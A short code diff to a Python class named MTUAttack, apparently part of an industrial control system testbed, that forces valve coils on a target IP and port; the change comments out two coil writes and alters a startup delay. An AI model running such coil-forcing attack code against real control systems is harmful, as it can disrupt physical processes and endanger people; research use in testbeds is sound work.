@@ -46,8 +46,8 @@ class MTUAttack(MTU):
         self.write_variable(name, val)
 
     def main_loop(self, *args, **kwargs):
-        self.change_coil(WM, True)
-        self.change_coil(VTC, True)
+        #self.change_coil(WM, True)
+        #self.change_coil(VTC, True)
         self.change_coil(VTF, False)
         self.change_coil(V1, True)
         self.change_coil(V2, True)
@@ -58,10 +58,8 @@ class MTUAttack(MTU):
             self.change_coil(VT1, False)
         
 
-
-
 def main(args):
-    time.sleep(15)
+    time.sleep(16)
     mtu = MTUAttack(args.ip, args.port)
     mtu.target_vars(args.filename)
 
